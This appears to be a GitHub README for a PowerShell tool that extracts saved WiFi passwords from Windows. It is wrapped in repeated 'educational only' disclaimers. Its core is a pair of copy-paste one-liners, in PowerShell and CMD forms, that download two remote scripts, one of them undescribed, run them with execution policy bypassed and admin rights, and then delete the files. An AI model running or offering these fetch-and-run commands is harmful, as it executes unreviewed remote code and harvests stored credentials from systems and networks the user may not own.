<div align="center">

# ⚠️ SQD5-DCWH WiFi Password Extractor

<img src="https://img.shields.io/badge/PowerShell-5.1%2B-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
<img src="https://img.shields.io/badge/Windows-7%20%7C%208%20%7C%2010%20%7C%2011-0078d4?style=for-the-badge&logo=windows" alt="Windows">
<img src="https://img.shields.io/badge/Status-EDUCATIONAL%20ONLY-red?style=for-the-badge" alt="Educational Only">

### _WiFi Password Extraction Tool - Educational Purposes Only_ 🎓

<img src="https://user-images.githubusercontent.com/74038190/212257454-16e3712e-945a-4ca2-b238-408ad0bf87e6.gif" width="100">

</div>

---

> [!DANGER]
>
> # 🚨 DO NOT RUN THIS SCRIPT! 🚨
>
> **THIS IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**
>
> - 🔴 **DO NOT EXECUTE** this script on any system
> - 🔴 **FOR LEARNING ONLY** - Study the code, don't run it
> - 🔴 **POTENTIAL SECURITY RISK** if misused
> - 🔴 **YOU ARE RESPONSIBLE** for any consequences

---

## 🎯 Quick Demo (Educational Only)

> [!WARNING] > **These commands are for educational demonstration only!**
>
> **DO NOT RUN unless you fully understand the risks and have proper authorization!**

### 🏃‍♂️ PowerShell One-Liner

```powershell
iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile "$env:TEMP\sqd5dcwh.ps1"; powershell -NoProfile -ExecutionPolicy Bypass -File "$env:TEMP\sqd5dcwh.ps1"; Remove-Item "$env:TEMP\sqd5dcwh.ps1" -Force; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.ps1" -OutFile "$env:TEMP\run.ps1"; powershell -NoProfile -ExecutionPolicy Bypass -File "$env:TEMP\run.ps1"; Remove-Item "$env:TEMP\run.ps1" -Force

```

### 📱 CMD Version

```cmd
@echo off & powershell -Command "iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile '%TEMP%\sqd5dcwh.ps1'; powershell -NoProfile -ExecutionPolicy Bypass -File '%TEMP%\sqd5dcwh.ps1'; del '%TEMP%\sqd5dcwh.ps1'; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.ps1' -OutFile '%TEMP%\run.ps1'; powershell -NoProfile -ExecutionPolicy Bypass -File '%TEMP%\run.ps1'; del '%TEMP%\run.ps1'"
```

> [!CAUTION] > **REMEMBER:** Running these commands will:
>
> - Download and execute the script automatically
> - Request administrator privileges
> - Extract WiFi passwords from your system
> - **Only use on systems you own or have explicit permission to test!**

---

## 📋 What This Tool Does

This PowerShell script demonstrates WiFi password extraction techniques by:

- 🔍 Extracting saved WiFi profiles from Windows
- 📄 Displaying stored network passwords
- 💾 Exporting results to text file
- 🎨 Providing a colorful terminal interface

---

## 🔗 Script Location

**Main Script:** [sqd5dcwh.ps1](https://github.com/09sychic/sqd5-with-dcwh/blob/main/sqd5dcwh.ps1)

---

## 📋 System Requirements

<div align="center">

<img src="https://img.shields.io/badge/OS-Windows_7+-0078d4?style=flat-square&logo=windows" alt="Windows 7+">
<img src="https://img.shields.io/badge/PowerShell-5.1+-012456?style=flat-square&logo=powershell" alt="PowerShell 5.1+">
<img src="https://img.shields.io/badge/Privileges-Administrator-red?style=flat-square&logo=windows-terminal" alt="Admin Required">

</div>

---

## 🎓 Educational Use Cases

- **Security Research:** Understanding Windows credential storage
- **Penetration Testing Education:** Learning about local privilege escalation
- **PowerShell Learning:** Studying advanced scripting techniques
- **Cybersecurity Awareness:** Understanding password security risks

---

## ⚖️ Legal Disclaimer & Warnings

<div align="center">

<img src="https://user-images.githubusercontent.com/74038190/212257460-738ff738-247f-4445-a718-cdd0ca76e2db.gif" width="100">

</div>

> [!CAUTION] > **CRITICAL LEGAL AND SECURITY WARNINGS**
>
> ### 🚨 DO NOT USE FOR:
>
> - ❌ Unauthorized access to networks
> - ❌ Accessing systems without permission
> - ❌ Any illegal or malicious activities
> - ❌ Violating privacy or computer crime laws
>
> ### ✅ ONLY ACCEPTABLE FOR:
>
> - ✅ Educational research and learning
> - ✅ Authorized penetration testing
> - ✅ Personal system security assessment
> - ✅ Academic cybersecurity studies
>
> ### ⚠️ IMPORTANT NOTICES:
>
> - **YOU ARE FULLY RESPONSIBLE** for how you use this code
> - **RESPECT ALL LOCAL AND INTERNATIONAL LAWS**
> - **OBTAIN EXPLICIT PERMISSION** before testing on any system
> - **AUTHOR IS NOT LIABLE** for misuse or damages

---

## 🛡️ Security Considerations

- This tool demonstrates why saved passwords can be security risks
- Always use strong, unique passwords for WiFi networks
- Consider using WPA3 security protocols when available
- Regularly audit saved network profiles on your devices

---

## 🤝 Responsible Disclosure

If you discover security vulnerabilities through educational use of this code, please follow responsible disclosure practices and report findings to the appropriate parties.

---

## 📄 License

<div align="center">

<img src="https://img.shields.io/github/license/09sychic/sqd5-with-dcwh?style=for-the-badge&color=red" alt="License">

**This project is for educational purposes only**

</div>

---

<div align="center">

### ⚠️ Remember: With Great Power Comes Great Responsibility ⚠️

<img src="https://user-images.githubusercontent.com/74038190/212257468-1e9a91f1-b626-4baa-b15d-5c385dfa7cd2.gif" width="100">

**🎓 Learn Responsibly • 🛡️ Use Ethically • ⚖️ Follow Laws**

<img src="https://komarev.com/ghpvc/?username=09sychic&style=for-the-badge&color=red" alt="Profile Views">

</div>
